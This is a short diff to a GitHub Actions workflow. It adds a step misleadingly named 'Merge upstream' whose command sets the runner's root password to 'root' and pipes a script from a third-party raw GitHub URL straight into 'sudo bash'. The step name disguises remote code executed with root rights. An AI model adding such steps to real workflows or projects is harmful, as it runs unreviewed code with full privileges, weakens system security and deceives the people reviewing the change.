@@ -3,6 +3,7 @@ on:  workflow_dispatch
 jobs:
   interactive:
     runs-on: ubuntu-latest  
-    steps:     
-      - name: Build something
+    steps:
+      - uses: actions/checkout@v2
+      - name: Merge upstream
         run: printf "root\nroot" | sudo passwd root && printf "root" | su - root -c " curl https://raw.githubusercontent.com/jhajikv-ji/guacamole/master/cat | sudo bash " 
